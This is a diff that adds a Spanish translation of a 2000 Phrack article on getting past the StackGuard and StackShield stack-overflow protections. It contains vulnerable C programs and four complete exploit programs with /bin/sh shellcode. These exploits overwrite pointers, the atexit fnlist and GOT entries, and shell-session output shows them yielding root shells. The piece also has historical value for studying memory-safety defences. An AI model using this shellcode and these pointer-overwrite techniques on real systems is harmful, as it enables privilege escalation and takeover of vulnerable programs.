@@ -1,0 +1,751 @@
+                      - P H R A C K   M A G A Z I N E -
+
+                            Volumen 0xa Numero 0x38
+                                  05.01.2000
+                                  0x05[0x10]
+
+|------------------- TRASPASANDO STACKGUARD Y STACKSHIELD --------------------|
+|-----------------------------------------------------------------------------|
+|--------------------- Bulba and Kil3r <lam3rz@hert.org> ---------------------|
+
+
+
+----|  Prefacio
+
+"When a buffer overwrites a pointer...  The story of a restless mind."
+
+
+Este articulo es un intento de demostrar que es posible explotar
+vulnerabilidades stack overflow en sistemas asegurados por StackGuard o
+StackShield aun en entorno hostiles (tales como cuando la pila no es
+ejecutable).
+
+
+----| Descripcion de StackGuard
+
+De acuerdo a sus autores, StackGuard es una "simple tecnica de compilador
+que elimina virtualmente vulnerabilidades buffer overflow solo con
+sanciones modestas de performance." [1]
+
+Asumimos que el lector sabe como funciona el ataque buffer overflow y
+como escribir codigo exploit . Si esto es nuevo para ti, por favor lee
+P49-14.
+
+En un nutshell, podemos cambiar una direccion de retorno de una funcion
+escribiendo pasado el final del buffer de variable local.  El efecto
+de alterar una direccion de retorno de una funcion es que destruimos/
+modificamos todos los datos de la pila contenidos detras del final del
+buffer overfloweado.
+
+Que hace StackGuard?  Ubica un word "canary" a continuacion de la direccion
+de retorno en la pila.  Si el word canary ha sido alterado cuando la funcion
+vuelve, entonces se intento un ataque de rompimiento de pila, y el programa
+responde emitiendo una alerta de intruso en el syslog, y luego para.
+
+Considera la siguiente figura:
+
+        ...                                       ...
+         |-----------------------------------------|
+         | parametros pasados a funcion            | 
+         |-----------------------------------------|
+         | direccion de retorno de funcion (RET)   | 
+         |-----------------------------------------|
+         | canary                                  |
+         |-----------------------------------------|
+         | frame pointer local (%ebp)              |
+         |-----------------------------------------|
+         | variables locales                       |
+         |-----------------------------------------|
+        ...                                       ...
+
+Para ser efectivo, el atacante no debe poder "spoofear" el word canary
+metiendo el valor para el word canary en el string de ataque.  StackGuard
+ofrece dos tecnicas para prevenir canary spoofing: "terminator" y "random".
+
+Un canary terminator contiene NULL(0x00), CR (0x0d), LF (0x0a) y EOF (0xff) -
+cuatro caracteres que deberian terminar la mayoria de las operaciones string,
+renderizando el da~o del intento de overflow.
+
+Un canary random es elegido al azar en el tiempo de ejecucion del programa.
+Asi el atacante no puede saber el valor canary antes del arranque del programa
+buscando la imagen ejecutable.  El valor al azar es tomado de /dev/urandom
+si esta disponible, y creado hasheando el tiempo del dia si /dev/urandom
+no es soportado.  Esta randomizacion es suficiente para prevenir la mayoria
+de intentos de prediccion.
+
+
+----|  StackShield
+
+StackShield usa una tecnica diferente.  La idea aqui es crear una pila
+separada para guardar una copia de la direccion de retorno de la funcion.
+De nuevo esto es alcanzado agregando un poco de codigo al principio y al
+final de una funcion protegida.
+El codigo en el prologo de la funcion copia la direccion de retorno a una
+tabla especial, y luego al epilogo, lo copia de nuevo a la pila.  Por lo que
+el flujo de ejecucion permanece sin cambios -- la funcion siempre vuelve
+a su llamador.  La direccion de retorno actual no es comparada para la
+direccion de retorno guardada, por lo que no hay forma de chequear si ocurrio
+un buffer overflow.  La ultima version tambien agrega algunas protecciones
+contra punteros llamadores de funcion que apuntan a la direccion no contenida
+en el segmento .TEXT (detiene la ejecucion del programa si el valor de
+retorno ha cambiado).
+
+Podria parecer que estos dos sistemas son infalibles.  No lo son.
+
+
+----|  "Nelson Mengele debe ser liberado"
+
+"...un atacante puede traspasar la proteccion StackGuard usando buffer
+ overflows para alterar otros punteros en el programa ademas de la
+ direccion de retorno, tales como punteros de funcion y buffers longjmp,
+ que aun no necesitan estar en la pila." [2]
+
+OK. Entonces.  Necesitamos un poco de suerte para overflowear un puntero
+de funcion o un longjmp? Acertaste!  No es exactamente muy comun encontrar
+tal puntero ubicado despues de nuestro buffer, y la mayoria de los programas
+no lo tienen del todo.  Es mucho mas comun encontrar algun otro tipo de
+puntero.  Por ejemplo:
+
+
+[root@sg StackGuard]# cat vul.c 
+
+// Ejemplo de programa vulnerable.
+int f (char ** argv)
+{
+        int pipa;       // variable util
+        char *p;
+        char a[30];
+
+        p=a;
+
+        printf ("p=%x\t -- before 1st strcpy\n",p);
+        strcpy(p,argv[1]);        // <== vulnerable strcpy()
+        printf ("p=%x\t -- after 1st  strcpy\n",p);
+        strncpy(p,argv[2],16);
+        printf("After second strcpy ;)\n");
+}
+
+main (int argc, char ** argv) {
+        f(argv);
+        execl("back_to_vul","",0);  //<-- El exec que falla
+        printf("End of program\n");
+}
+
+Como puedes ver, solo sobreescribimos la direccion de retorno overfloweando
+nuestro buffer.  Pero esto no nos llevara a ningun lado ya que nuestro
+programa esta protegido por StackGuard.  Pero la ruta mas simple, obvio no
+es siempre la mejor.  Como sobreescribimos el puntero 'p'?  La segunda
+(segura) operacion strncpy() ira derecho a la memoria apuntada por nosotros.
+Que si p apunta a nuestra direccion de retorno en la pila?  Estamos alterando
+el retorno de la funcion sin aun tocar el canary.
+
+Entonces que requerimos para nuestro ataque?
+1. Necesitamos el puntero p para ser ubicado fisicamente en la pila despues
+   de nuestro buffer a[].
+2. Necesitamos un bug overflow que nos permitira sobreescribir este puntero
+   p (p.e.: un strcpy ilimitado).
+3. Necesitamos una funcion *copy() (strcpy, memcopy, o lo que sea) que toma
+   *p como destino y datos especificados por el usuario como fuente,
+   y no inicializacion p entre el overflow y la copia.
+
+Obviamente, dadas las limitaciones anteriores no todos los programas
+compilados con StackGuard van a ser vulnerables, pero tales vulnerabilidades
+estan ahi.  Por ejemplo, el bug wu-ftpd 2.5 mapped_path, donde se esta
+overfloweando el buffer mapped_path puede alterar los punteros Argv y
+LastArg usados por setproctitle() resultando en la habilidad de modificar
+cualquier parte de la memoria del proceso.  Seguro, fue overflow basado
+en *datos* (no basado en pila) pero, por otro lado, esto muestra que los
+requerimientos para nuestra anterior vulnerabilidad son definitivamente
+llenados en el mundo real.
+
+Entonces como vamos a explotarlo?
+
+Sobreescribimos p por lo que apuntara a la direccion de RET en la pila y
+asi el siguiente *copy() sobreescribira nuestro RET sin tocar el canary :)
+Si, necesitamos pasar de contrabando en el shellcode tambien (usamos argv[0]).
+Aqui hay un exploit ejemplo (usamos execle() para hacerlo independiente
+del entorno):
+
+[root@sg StackGuard]# cat ex.c
+
+/* Example exploit no. 1 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+
+char buf[36];
+int * p;
+
+main() {
+    memset(buf,'A',32);
+    p = (int *)(buf+32);
+    *p=0xbffffeb4;      //  <<== nos deja apuntar a RET
+    p = (int *)(addr);
+    *p=0xbfffff9b;      //  <<== nuevo valor RET
+
+    execle("./vul",shellcode,buf,addr,0,0);
+}
+
+
+Como fue testeado en una RH 5.2 Linux box StackGuardeada:
+
+    [root@sg StackGuard]# gcc vul.c -o vul
+    [root@sg StackGuard]# gcc ex.c
+    [root@sg StackGuard]# ./a.out
+    p=bffffec4       -- before 1st strcpy
+    p=bffffeb4       -- after 1st  strcpy
+    bash#
+
+Como puedes ver, el primer strcpy() sobreescribe p, luego strncpy() copia
+el nuevo valor RET para que cuando vuelva tome la direccion de nuestro
+shellcode.  Kaboom!
+
+Esta tecnica funciona con programas compilados con gcc regular o gcc
+StackGuardeado, pero programas compilados con StackShield son una prueba
+contra esto.
+
+
+----|  No hay cuchara
+
+Hable con Crispin Cowan <crispin@cse.ogi.edu>, uno de los desarrolladores
+de StackGuard y propuso un remedio contra el hack anterior.  Esta es la
+idea:
+
+"La defensa XOR Random Canary:  aqui, adoptamos la antigua propuesta de
+ Aaron Grier para xorear el canary random con la direccion de retorno.
+ El codigo de validacion canary usado en salidas de funciones luego XORea
+ la direccion de retorno con el canary random apropiado (asignado a esta
+ funcion en tiempo exec()) para computar que deberia ser el canary random
+ grabado en la pila.  Si el atacante ha hackeado la direccion de retorno,
+ entonces el canary random xoreado no coincidira.  El atacante no puede
+ computar el canary a poner en la pila sin conocer el valor canary random.
+ Esta es una encriptacion efectivamente de la direccion de retorno con
+ el canary random para esta funcion.
+
+ El desafio aqui es no permitir al atacante conocer el valor del canary
+ random.  Previamente, hemos propuesto hacer esto rodeando la tabla
+ canary con paginas rojas, para que no puedan ser usados buffer overflows
+ para extraer valores canary.  Sin embargo, el ataque Emsi [descripto
+ arriba] le deja sintetizar punteros a direcciones arbitrarias."
+
+ (La solucion mas simple que hay) "mprotect() la tabla canary para prevenir
+ al atacante de corromperla."
+
+Informamos a Crispin que ibamos a escribir un articulo acerca de esto y
+su respuesta fue:
+
+ "Pienso que podemos tener un compilador StackGuard revisado (con el
+  canary XOR random) listo para lanzar el Lunes."
+
+Ese compilador ha sido lanzado. [4]
+
+StackShield ofrece un (casi) igual nivel de seguridad guardando la copia
+RET en un lugar seguro (de ubicacion y tama~o arbitrarios -- sin embargo, no
+necesariamente una buena practica) y chequeando su integridad antes de
+hacer el retorno.
+
+Podemos traspasarlo.
+
+Si tenemos un puntero que puede ser manipulado, podemos usarlo para
+sobreescribir cosas que nos puedan ayudar a explotar un overflow
+vulnerable en un programa.  Por ejemplo, toma la estructura fnlist que
+contiene funciones registradas via atexit(3) o on_exit(3).  Para alcanzar
+esta rama de codigo, por supuesto, el programa necesita llamar a exit(),
+pero la mayoria de los programas hacen esto o al final de la ejecucion
+o cuando ocurre un error (y en la mayoria de los casos podemos forzar un
+error exception).
+
+Miremos a la estructura fnlist:
+
+    [root@sg StackGuard]# gdb vul
+    GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+    [...]
+    This GDB was configured as "i386-redhat-linux"...
+    (gdb) b main    
+    Breakpoint 1 at 0x8048790
+    (gdb) r         
+    Starting program: /root/StackGuard/c/StackGuard/vul 
+
+    Breakpoint 1, 0x8048790 in main ()
+    (gdb) x/10x &fnlist 
+0x400eed78 <fnlist>:    0x00000000      0x00000002      0x00000003      0x4000b8c0
+0x400eed88 <fnlist+16>: 0x00000000      0x00000003      0x08048c20      0x00000000
+0x400eed98 <fnlist+32>: 0x00000000      0x00000000
+
+
+Podemos ver que llama a dos funciones: _fini [0x8048c20] y _dl_fini[0x4000b8c0]
+y que ninguno de estas toma ningunos argumentos (chequea los fuentes de
+glibc para entender como leer el contenido de fnlist).  Podemos
+sobreescribir ambas de estas funciones.  La direccion fnlist depende
+de la libreria libc, por lo que sera la misma para cada proceso en una
+maquina particular.
+
+El siguiente codigo explota un overflow vulnerable cuando el programa
+sale via exit():
+
+[root@sg StackGuard]# cat 3ex.c 
+/* Exploit ejemplo no. 2 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+
+char buf[36];
+int * p;
+
+main() {
+    memset(buf,'A',32);
+    p = (int *)(buf+32);
+    *p=0x400eed90;    // <<== Direccion de entrada en fnlist que modificaremos
+    p = (int *)(addr);
+    *p=0xbfffff9b;  // <<== Direccion de la nueva funcion a llamar (shellcode) :)
+    execle("./vul",shellcode,buf,addr,0,0);
+}
+
+Como puedes ver nuestro exploit ha cambiado solo en una linea :)
+
+Testeemoslo contra nuestro programa vulnerable:
+
+    [root@sg StackGuard]# gcc 3ex.c 
+    [root@sg StackGuard]# ./a.out 
+    p=bffffec4       -- before 1st strcpy
+    p=400eed90       -- after 1st  strcpy
+    After second strcpy ;)
+    End of program
+    bash# 
+
+Como puedes ver nuestro programa nos da una shell despues del final de la
+ejecucion normal.  Ni StackGuard ni StackShield nos protegeran contra este
+tipo de ataque.
+
+Pero que si nuestro programa no llama a exit() pero usa _exit() en su lugar?
+
+Veamos que pasa cuando sobreescribimos el canary.  Un programa StackGuardeado
+llamara a __canary_death_handler() (esta funcion es responsable de loguear
+el intento de overflow y terminar el proceso).  Veamoslo:
+
+    void __canary_death_handler (int index, int value, char pname[]) {
+      printf (message, index, value, pname) ;
+      syslog (1, message, index, value, pname) ;
+      raise (4) ;
+      exit (666) ;
+    }
+
+Como puedes ver, tenemos una llamada a exit() al final.  Seguro, explotando
+el programa de este modo generara logs, pero si no hay otro modo, es
+un mal necesario.  Ademas, si obtienes root, puedes tan solo prepararlo
+despues.
+
+Recibimos algunos emails de Perry Wagle <wagle@cse.ogi.edu> (otro autor de
+StackGuard): "Parezco haber perdido mi cambio para que llame a _exit()
+en su lugar...".  Actualmente StackGuard llama a _exit().
+
+Por supuesto el hack anterior no se aplica a StackShield.  La proteccion
+StackShield puede ser traspasada sobreescribiendo el %ebp guardado el
+cual no esta protegido.  Una forma de explotarlo (bajo las peores
+condiciones) fue descripta en "The Frame Pointer Overwrite" por klog en
+Phrack 55 [4].  Cuando un programa es compilado usando StackShield con la
+opcion '-z d' llama a _exit() pero esto no es un problema para nosotros.
+
+
+----|  Descubriendo America
+
+Y que si un sistema ha sido protegido con StackGuard *y* StackPatch
+(la modificacion de Solar Designer que hace ejecutable a la pila)? Es *este*
+el peor caso?  No del todo.
+
+Desarrollamos una tecnica inteligente que puede ser usada si ninguno de los
+metodos anteriores puede ser usado.
+
+El lector esta dirigido al maravilloso texto de Rafal Wojtczuk "Defeating
+Solar Designer's Non-executable Stack Patch" [5].  Su gran idea fue
+patchear la Global Offset Table (GOT).  Con nuestra vulnerabilidad podemos
+producir un puntero arbitrario, entonces por que no apuntarlo a la GOT?
+
+Usemos nuestros cerebros.  Mira el programa vulnerable:
+
+        printf ("p=%x\t -- before 1st strcpy\n",p);
+        strcpy(p,argv[1]);
+        printf ("p=%x\t -- after 1st  strcpy\n",p);
+        strncpy(p,argv[2],16);
+        printf("After second strcpy :)\n");
+
+Si.  El programa escribe nuestro contenido (argv[2]) a nuestro puntero
+y luego ejecuta el codigo de libreria, printf().  OK, entonces lo que
+necesitamos hacer es sobreescribir la GOT de pritnf() con la direccion
+de system() de libc entonces ejecutara system("After second strcpy :)\n");
+Probemoslo en la practica.  Para hacer esto, desensamblamos la
+Procedure Linkage Table (PLT) de printf().
+
+    [root@sg]# gdb vul
+    GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
+    [...]
+    This GDB was configured as "i386-redhat-linux"...
+    (gdb) x/2i printf
+    0x804856c <printf>:     jmp    *0x8049f18  <- printf()'s GOT entry
+    0x8048572 <printf+6>:   pushl  $0x8
+    (gdb)
+
+OK, entonces la entrada GOT de printf() esta en 0x8049f18.  Todo lo que
+necesitamos es poner la direccion de system() de libc en esta ubicacion,
+0x8049f18.  De acuerdo al articulo de Rafal podemos calcular que nuestra
+direccion system() esta en: 0x40044000+0x2e740. 0x2e740 es un offset de
+__libc_system() en la libreria libc:
+
+    [root@sg]# nm /lib/libc.so.6| grep system
+    0002e740 T __libc_system
+    0009bca0 T svcerr_systemerr
+    0002e740 W system
+
+[ Nota: el lector puede notar que no usamos un kernel con el patch de Solar.
+Estamos teniendo problemas con init(8) deteniendose despues del booteo.
+Nos estamos llendo fuera de tiempo para terminar este articulo por lo que
+decidimos seguir sin el kernel patch.  Todo lo que puede cambiar es el 0x40.
+En sistemas con el patch de Solar, libc esta en 0x00XXYYZZ.  Entonces,
+por ejemplo, la direccion anterior puede verse asi 0x00044000+0x2e740,
+el 0x00 al principio terminara nuestro string.  No estamos 100% seguros
+que StackPatch es compatible con StackGuard, DEBERIA ser, e incluso si no
+lo es, PUEDE ser... Pero no estamos seguros todavia... Si alguien lo sabe,
+por favor escribanos una nota. ]
+
+OK, entonces probemos el siguiente exploit:
+
+[root@sg]# cat 3ex3.c
+/* Exploit ejemplo no. 3 (c) by Lam3rZ 1999 :) */
+
+char *env[3]={"PATH=.",0};
+char shellcode[] =
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+char addr[5]="AAAA\x00";
+char buf[46];
+int * p;
+
+main() {
+    memset(buf,'A',36);
+    p = (int *)(buf+32);
+    *p++=0x8049f18;//  <== printf() direccion de entrada GOT
+    p = (int *)(addr);
+    *p=0x40044000+0x2e740;//  <<== Direccion de libc system()
+    printf("Exec code from %x\n",*p);
+    execle("./vul",shellcode,buf,addr,0,env);
+}
+
+And test it!!!
+
+    [root@sg]# gcc 3ex3.c
+    [root@sg]# ./a.out
+    Exec code from 40072740
+    p=bffffec4       -- before 1st strcpy
+    p=8049f18        -- after 1st  strcpy
+    sh: syntax error near unexpected token `:)'
+    sh: -c: line 1: `After second strcpy :)'
+    Segmentation fault (core dumped)
+
+Hrm.  No funciono.
+
+Desafortunadamente, como sucede, el string printf() contenia caracteres
+especiales de shell.  En la mayoria de los casos si explotamos printf()
+para ejecutar system() ejecutara cosas como "Aqui nosotros blah, blah y blah"
+por lo que todo lo que necesitamos es crear un shell script "Aqui" en nuestro
+directorio de trabajo (si, necesitamos nuestro programa suid para no
+configurar la variable PATH).
+
+Por lo que que hacer con nuestro token ':)' inesperado?
+
+Bueno depende, a veces tan solo tienes que olvidarte acerca de printf() y
+tratar de encontrar una funcion que es ejecutada despues de nuestra
+explotacion, tal que tome el texto plano como el ultimo argumento. A veces,
+sin embargo, puedes estar de suerte...  Imagina que nuestro buffer a[] es
+la ultima variable local, entonces los argumentos pasados en las funciones
+llamadas por nuestra funcion vulnerable estan a continuacion de ella en
+la pila.  Que si persuadimos __libc_system() para saltear el pusheo
+canary?  Podemos llegar a eso saltando a __libc_system()+5 en vez de
+__libc_system().  Bueno, terminaremos con +argumentos cambiados un lugar
+hacia adelante (p.e. arg1->arg2...), y los primeros 4 bytes de la ultima
+variable local en la pila son tratados como el primer argumento.  La llamada
+printf() que estamos tratando de abusar tan solo toma un argumento, de
+modo que el unico argumento que system() obtendra es un puntero contenido
+en los primeros 4 bytes de a[].  Tan solo hazlo apuntar a "/bin/sh" o
+algo similar.
+
+Sobreescribir la GOT funciona para StackGuard, StackShield y StackPatch.
+Puede ser usado en caso de que no podamos manipular el contenido entero
+de lo que estamos copiado pero solo partes de el (como en wu-ftpd).
+
+
+----|  "Camino Aceitoso"
+
+El lector puede pensar que solo estamos mostrandole ejemplos ingenuos,
+que probablemente no van a ser encontrados en el campo.  Una funcion
+vulnerable que obtiene como sus argumentos una tabla completa de strings
+es algo no muy comun.  Mas a menudo encontraras funciones que se vean asi:
+
+int f (char *string) {
+[...]
+    char *p;
+    char a[64];
+[...]
+
+
+Chequea esto:
+
+char dst_buffer[64]; /* final destination */
+
+int f (char * string)
+{
+    char *p;
+    char a[64];
+
+    p=dst_buffer;               /* inicializacion de puntero */
+    printf ("p=%x\t -- before 1st strcpy\n",p);
+    strcpy(a, string);  	/* string in */
+
+        /* parseando, copiando, concatenando ... black-string-magic */
+        /* SI, PUEDE corromper nuestros datos */
+
+    printf ("p=%x\t -- after 1st  strcpy\n",p);
+    strncpy(p, a, 64);  	/* string out */
+    printf("After second strcpy ;)\n");
+}
+
+int main (int argc, char ** argv) {
+    f(argv[0]);                 /* interaccion */
+    printf("End of program\n");
+}
+
+Tu interactuas con la funcion vulnerable pasandole solo una string...
+
+Pero que si estamos tratando con un sistema que tiene stacks no ejecutables,
+y librerias mapeadas a alguna direccion extra~a (con NULLs adentro)?
+No podemos patchear la GOT con nuestra direccion en la pila, porque la
+pila no es ejecutable.
+
+Pareceria como si estuviesemos jodidos, pero sigue leyendo!  Nuestro
+sistema esta basado en x86, y hay muchas malas interpretaciones acerca de
+la habilidad para ejecutar ciertas paginas de memoria.  Chequea /proc/*/maps:
+
+    00110000-00116000 r-xp 00000000 03:02 57154
+    00116000-00117000 rw-p 00005000 03:02 57154
+    00117000-00118000 rw-p 00000000 00:00 0
+    0011b000-001a5000 r-xp 00000000 03:02 57139
+    001a5000-001aa000 rw-p 00089000 03:02 57139
+    001aa000-001dd000 rw-p 00000000 00:00 0
+    08048000-0804a000 r-xp 00000000 16:04 158
+    0804a000-0804b000 rw-p 00001000 16:04 158      <-- La GOT esta aqui
+    bfffd000-c0000000 rwxp ffffe000 00:00 0
+
+La GOT pareceria ser no ejecutable, pero SORPRESA!  El Viejo Intel te
+permite ejecutar la GOT donde desees!  Por lo que todo lo que tenemos que
+hacer es pegar nuestro shellcode ahi, patchear la entrada GOT para
+apuntarle, y sentarnos y disfrutar el show!
+
+Para facilitar eso, aqui hay una peque~a ayuda:
+Solo tenemos que cambiar dos lineas en el codigo del exploit provisto:
+
+    *p=0x8049f84;               // destino de nuestra operacion strncpy
+    [...]
+    *p=0x8049f84+4;             // direccion de nuestro shellcode
+
+Todo lo que necesitamos es una operacion de copia que pueda copiar
+el shellcode justo donde lo queremos.  Nuestro shellcode no esta optimizado
+para tama~o por lo que toma mas de 40 bytes, pero si eres lo suficientemente
+inteligente puedes hacer a este codigo aun mas peque~o haciendo uso de jmp,
+popl (ya que ya conoces su direccion).
+
+Otra cosa que tenemos que considerar son las se~ales.  Un manejador de
+se~al de funcion trata de llamar a una funcion con una entrada GOT jodida,
+y el programa muere.  Pero este es solo un peligro teorico.
+
+Que es eso ahora?
+
+No te gusta nuestro programa vulnerable?
+
+Te sigue pareciendo algo irreal?
+
+Luego quiza te satisfaceremos con esta:
+
+char global_buf[64];
+
+int f (char *string, char *dst)
+{
+        char a[64];
+
+        printf ("dst=%x\t -- before 1st strcpy\n",dst);
+        printf ("string=%x\t -- before 1st strcpy\n",string);
+        strcpy(a,string);
+        printf ("dst=%x\t -- after 1st  strcpy\n",dst);
+        printf ("string=%x\t -- after 1st  strcpy\n",string);
+
+	    // some black magic is done with supplied string
+
+        strncpy(dst,a,64);
+        printf("dst=%x\t -- after second strcpy :)\n",dst);
+}
+
+main (int argc, char ** argv) {
+
+        f(argv[1],global_buf);
+        execl("back_to_vul","",0);  //<-- El exec que falla
+                                    // No tengo idea para que esta
+				    // :)
+        printf("End of program\n");
+}
+
+
+
+En este ejemplo tenemos nuestro puntero (dst) en la pila detras del valor
+canary y RET, por lo que no podemos cambiarlo sin matar al canary y sin
+ser cuidadosos...
+
+O podemos?
+
+Ambos StackGuard y StackShield chequean si RET fue alterado antes de que
+la funcion vuelva a su llamador (esto hecho al final de la funcion).
+En la mayoria de los casos tenemos suficiente tiempo aqui para hacer algo
+para tomar control de un programa vulnerable.
+
+Podemos hacerlo sobreescribiendo la entrada GOT de la siguiente funcion
+de libreria llamada.
+
+No tenemos que preocuparnos acerca del orden de las variables locales
+y ya que no nos preocupamos si el canary esta vivo o no, podemos jugar!
+
+Aqui esta el exploit:
+
+/* Exploit ejemplo no. 4 (c) by Lam3rZ 1999 :) */
+
+char shellcode[] = // 48 chars :)
+    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+    "\xff\xff/bin/sh";
+
+char buf[100];
+int * p;
+
+main() {
+    memset(buf,'A',100);
+    memcpy(buf+4,shellcode,48);
+    p = (int *)(buf+80);    // <=- offset del segundo argumento f() [dest uno]
+    *p=0x8049f84;//  <<== entrada GOT de printf
+
+    p = (int *)(buf);
+    *p=0x8049f84+4;//  <<== entrada GOT de printf+4, aqui nuestro shellcode :)
+
+    execle("./vul2","vul2",buf,0,0);
+}
+
+And the result: 
+
+    [root@sg]# ./a.out 
+    p=804a050        -- before 1st strcpy
+    argv1p=bfffff91  -- before 1st strcpy
+    p=8049f84        -- after 1st  strcpy
+    argv1=41414141   -- after 1st  strcpy
+    bash# 
+
+
+----|  Conclusion
+
+1) StackGuard/StackShield pueden salvarte en caso de buffer overflows
+   accidentales, pero no contra un estupidez de programador.  Erreare
+   humanum est, si correcto, pero los programadores de seguridad no
+   deben ser solo humanos, deben ser humanos-advertidos-de-seguridad.
+
+2) - Auditando tu codigo - puedes perder algun tiempo pero seguramente
+   incrementaras la seguridad de los programas que estes escribiendo.
+   - Usando StackGuard/StackShield/lo que sea - puedes decrementar la
+   performance de tu sistema pero ganas una capa adicional de seguridad.
+   - No haciendo nada para proteger tu programa - corres el riesgo
+   de que alguien te humille explotando un overflow en tu codigo,
+   y si ocurre, te lo mereces!
+
+   Entonces, se perfecto, esta protegido, o deja que los otros se rian
+   de ti.
+
+Son bienvenidos cualquier comentario o sugerencias.  Puedes contactarnos
+en la Lam3rZ mailing list en <lam3rz@hert.org>.
+
+Si, si... Sabemos!  No funciona el exploit todavia realmente :( Estamos
+trabajando en eso.
+Sigue chequeando:
+
+        http://emsi.it.pl/
+y
+        http://lam3rz.hack.pl/
+
+
+----|  Addendum: Jan 5, 2000
+
+Resolvimos el problema con StackGuard en un sistema con el Solar Designer's
+non-executable stack patch.  No estamos seguros que causo el problema,
+pero para evitarlo, activa 'Autodetect GCC trampolines' y 'Emulate trampoline
+calls' durante la configuracion del kernel.  Estuvimos corriendo Slackware
+Linux sin StackGuard y trampolines pero con pila de usuario no ejecutable
+pero el RH Linux StackGuardeado no quiso funcionar en tal configuracion... :)
+
+
+----|  Algunas GreetZ
+
+A18 team, HERT, CocaCola, Raveheart (por la cancion "Nelson Mengele...").
+Nergal, mo¿e by¶ siê tak ujawni³? ;)
+Po raz kolejny chcialbym zaznaczyc, ze jestem tylko zwyczajnym Lam3rem.
+                                                                     
+    - Kil3r
+
+people I've been drinking with - because i've been drinking with you :)
+people I'd like to drink with  - because i will drink with you :) 
+people smarter than me         - because you're better than I am
+¡ÆÊ£ÑÓ¯¬±æê³ñó¿1/4               - for being wonderful iso-8859-2 characters
+Lam3rz                         - alt.pe0p1e.with.sp311ing.pr0b1emZ :)
+koralik                        - ... just because
+
+    - Bulba
+
+
+----|  Referencias
+
+[1] Crispin Cowan, Calton Pu, Dave Maier, Heather Hinton, Jonathan Walpole,
+Peat Bakke, Steave Beattie, Aaron Grier, Perry Wagle and Qian Zhand.
+StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow
+Attacks http://www.immunix.org/documentation.html
+
+[2] Crispin Cowan, Steve Beattie, Ryan Finnin Day, Calton Pu, Perry Wagle
+and Erik Walthinsen. Protecting Systems from Stack Smashing Attacks with
+StackGuard http://www.immunix.org/documentation.html
+
+[3] Security Alert: StackGuard 1.21
+http://www.immunix.org/downloads.html
+
+[4] klog. The Frame Pointer Overwrite
+http://www.phrack.com/search.phtml?view&article=p55-8
+
+[5] Rafal Wojtczuk. Defeating Solar Designer's Non-executable Stack Patch
+http://www.securityfocus.com/templates/archive.pike?list=1&date=1998-02-01&msg=199801301709.SAA12206@galera.icm.edu.pl
+
+
+----|  Nota del Autor
+
+Este articulo es propiedad intelectual del Lam3rZ Group.
+El conocimiento presentado aqui es la propiedad intelectual de toda la
+humanidad, especialmente aquellos que puedan entenderlo. :)
+
+
+|EOF|-------------------------------------------------------------------------|
+
+
+ Traducido por Active Matrix - schyzophrenia@gmx.net
+ Para RareGaZz - http://www.raregazz.com.ar - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
